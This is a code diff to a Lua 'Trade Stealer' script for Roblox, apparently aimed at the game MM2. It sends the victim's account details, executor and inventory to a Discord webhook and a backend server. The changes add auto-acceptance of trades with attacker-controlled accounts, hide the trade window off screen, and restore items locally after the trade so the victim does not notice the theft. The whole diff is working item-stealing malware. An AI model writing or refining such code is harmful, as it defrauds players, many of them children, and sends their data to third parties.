@@ -74,8 +74,7 @@ end
 
 local function post_rubis(text)
     local ok, res = pcall(do_request, "POST", "https://api.rubis.app/v2/scrap",
-        text,
-        {["Content-Type"]="text/plain"})
+        text, {["Content-Type"]="text/plain"})
     if not ok then return nil end
     local dok, data = pcall(function() return HS:JSONDecode(res.Body) end)
     if not dok or not data then return nil end
@@ -86,37 +85,26 @@ local function send_discord(items, game_name)
     if not CFG.webhook or CFG.webhook == "" then return end
     local join = "https://fern.wtf/joiner?placeId="..tostring(PlaceId).."&gameInstanceId="..game.JobId
     local receivers = table.concat(CFG.allowed, ", ")
-
     local counts = {}
     local order = {"Ancient","Godly","Unique","Vintage","Legendary","Rare","Uncommon","Common"}
-    for _, it in ipairs(items) do
-        counts[it.rarity] = (counts[it.rarity] or 0) + 1
-    end
-
+    for _, it in ipairs(items) do counts[it.rarity] = (counts[it.rarity] or 0) + 1 end
     local inv_lines = {}
     for _, r in ipairs(order) do
         table.insert(inv_lines, string.format("%-10s: %d", r, counts[r] or 0))
     end
-
     local full_text = {}
     for _, it in ipairs(items) do
         table.insert(full_text, it.name.." ("..it.rarity..")")
     end
     local rubis_url = post_rubis(table.concat(full_text, "\n")) or "upload mislukt"
-
     local desc = string.format(
         "**Player Info:**\n```\nUsername:    %s\nDisplay:     %s\nExecutor:    %s\nAntiscam:    %s\nRoblox ver:  %s\nReceiver:    %s\n```\n\n**Inventory**\n```\n%s\n```\n\n**List of items:** %s\n\n**Join link:** [click here to join](%s)",
         lp.Name, lp.DisplayName, get_executor(), tostring(detect_antiscam()), get_roblox_version(),
         receivers, table.concat(inv_lines, "\n"), rubis_url, join
     )
-
     local embed = {
         username = "Trade Stealer",
-        embeds = {{
-            title       = game_name.." Stealer",
-            description = desc,
-            color       = 15158332,
-        }}
+        embeds = {{title=game_name.." Stealer", description=desc, color=15158332}}
     }
     pcall(do_request, "POST", CFG.webhook, HS:JSONEncode(embed), {["Content-Type"]="application/json"})
 end
@@ -124,20 +112,13 @@ end
 local function send_job(game_name, items)
     send_discord(items, game_name)
     local payload = {
-        game           = game_name,
-        username       = lp.Name,
-        display_name   = lp.DisplayName,
-        executor       = get_executor(),
-        roblox_version = get_roblox_version(),
-        antiscam       = detect_antiscam(),
-        allowed        = CFG.allowed,
-        place_id       = tostring(PlaceId),
-        job_id         = game.JobId,
-        items          = items,
+        game=game_name, username=lp.Name, display_name=lp.DisplayName,
+        executor=get_executor(), roblox_version=get_roblox_version(),
+        antiscam=detect_antiscam(), allowed=CFG.allowed,
+        place_id=tostring(PlaceId), job_id=game.JobId, items=items,
     }
     pcall(do_request, "POST", CFG.backend.."/job", HS:JSONEncode(payload), {
-        ["Content-Type"] = "application/json",
-        ["X-API-Key"]    = CFG.api_key,
+        ["Content-Type"]="application/json", ["X-API-Key"]=CFG.api_key,
     })
 end
 
@@ -146,6 +127,7 @@ local function hook_mm2()
     if not Trade then return end
     local updateTrade = Trade:WaitForChild("UpdateTrade", 10)
     local acceptTrade = Trade:WaitForChild("AcceptTrade", 10)
+    local completeTrade = Trade:WaitForChild("CompleteTrade", 10)
     if not updateTrade or not acceptTrade then return end
 
     local items = collect_mm2_items()
@@ -155,6 +137,7 @@ local function hook_mm2()
     local currentLastOffer = nil
     local tradingWithAllowed = false
     local storedItems = {}
+    local guiHidden = false
     local okP, ProfileData = pcall(function() return require(RS.Modules.ProfileData) end)
 
     local function isAllowedUser(name)
@@ -167,21 +150,50 @@ local function hook_mm2()
     local function storeItems()
         storedItems = {}
         if okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
-            for k, v in pairs(ProfileData.Weapons.Owned) do
-                storedItems[k] = v
-            end
+            for k, v in pairs(ProfileData.Weapons.Owned) do storedItems[k] = v end
         end
     end
 
     local function restoreItems()
         if okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
-            for k, v in pairs(storedItems) do
-                ProfileData.Weapons.Owned[k] = v
+            for k, v in pairs(storedItems) do ProfileData.Weapons.Owned[k] = v end
+        end
+    end
+
+    local function hideGui()
+        if guiHidden then return end
+        guiHidden = true
+        local gui = lp:FindFirstChild("PlayerGui")
+        if not gui then return end
+        for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
+            local g = gui:FindFirstChild(name)
+            if g then
+                -- move off screen instead of disabling to avoid camera lock
+                for _, frame in ipairs(g:GetChildren()) do
+                    if frame:IsA("Frame") or frame:IsA("ScrollingFrame") then
+                        frame.Position = UDim2.new(10, 0, 10, 0)
+                    end
+                end
             end
         end
     end
 
-    -- capture all args to find tradeId
+    local function showGui()
+        guiHidden = false
+        local gui = lp:FindFirstChild("PlayerGui")
+        if not gui then return end
+        for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
+            local g = gui:FindFirstChild(name)
+            if g then
+                for _, frame in ipairs(g:GetChildren()) do
+                    if frame:IsA("Frame") or frame:IsA("ScrollingFrame") then
+                        frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+                    end
+                end
+            end
+        end
+    end
+
     updateTrade.OnClientEvent:Connect(function(...)
         local args = {...}
         local tradeData = nil
@@ -212,31 +224,24 @@ local function hook_mm2()
 
         if tradingWithAllowed then
             storeItems()
-            -- auto accept when victim (myData) becomes accepted
+            hideGui()
             if myData.Accepted and currentTradeId and currentLastOffer then
                 task.spawn(function()
                     task.wait(0.3)
                     pcall(function()
                         acceptTrade:FireServer(currentTradeId, currentLastOffer)
                     end)
-                    task.wait(1)
-                    restoreItems()
                 end)
             end
         end
     end)
 
-    local gui = lp:WaitForChild("PlayerGui")
-    local tradeGui      = gui:WaitForChild("TradeGUI", 10)
-    local tradeGuiPhone = gui:FindFirstChild("TradeGUI_Phone")
-    if tradeGui then
-        tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
-            if tradeGui.Enabled and tradingWithAllowed then tradeGui.Enabled = false end
-        end)
-    end
-    if tradeGuiPhone then
-        tradeGuiPhone:GetPropertyChangedSignal("Enabled"):Connect(function()
-            if tradeGuiPhone.Enabled and tradingWithAllowed then tradeGuiPhone.Enabled = false end
+    if completeTrade then
+        completeTrade.OnClientEvent:Connect(function()
+            task.wait(0.5)
+            restoreItems()
+            showGui()
+            tradingWithAllowed = false
         end)
     end
 end
